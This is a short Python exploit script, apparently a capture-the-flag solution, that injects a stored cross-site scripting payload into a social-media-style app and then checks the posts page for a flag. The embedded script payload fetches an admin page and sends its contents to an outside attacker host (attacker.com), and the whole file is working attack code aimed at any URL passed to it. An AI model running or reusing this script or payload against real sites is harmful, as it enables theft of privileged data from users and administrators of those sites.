#!/usr/bin/env python3
import requests
import sys
import urllib.parse

def exploit_xss(url, payload):
    """
    Exploit XSS vulnerability in the social media platform
    """
    try:
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Send the request
        data = {
            'message': encoded_payload,
            'user_id': '1'
        }
        
        response = requests.post(f"{url}/post", json=data)
        
        # Check if the payload was successfully injected
        if response.status_code == 200:
            print("[+] XSS payload successfully injected")
            
            # Now check if we can retrieve the flag
            check_response = requests.get(f"{url}/posts")
            if "TELISP{" in check_response.text:
                print("[+] Success! Found flag:")
                print(check_response.text.split("TELISP{")[1].split("}")[0])
                return True
        else:
            print("[-] Failed to inject XSS payload")
            return False
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xss.py <target_url>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    payload = "<script>fetch('/admin/flag').then(r=>r.text()).then(t=>fetch('http://attacker.com/steal?flag='+t))</script>"
    
    print("[*] Attempting XSS attack...")
    exploit_xss(target_url, payload) 